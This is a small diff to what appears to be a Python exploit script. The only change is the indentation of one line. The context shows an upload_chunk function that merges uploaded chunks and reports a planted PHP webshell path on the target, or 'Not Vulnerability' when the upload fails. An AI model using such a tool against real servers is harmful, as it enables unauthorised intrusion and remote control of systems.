@@ -40,7 +40,7 @@ def upload_chunk(url):
 		merge_file(upload_url, chunk_id)
 		print('\nWebshell: %s/%d.php' % (url.rstrip('/'), chunk_id))
 	elif result['msg'] != '':
-        print(f"Not Vulnerability, {result['msg']}.")
+                print(f"Not Vulnerability, {result['msg']}.")
 	else:
 		print('Not Vulnerability.')
 
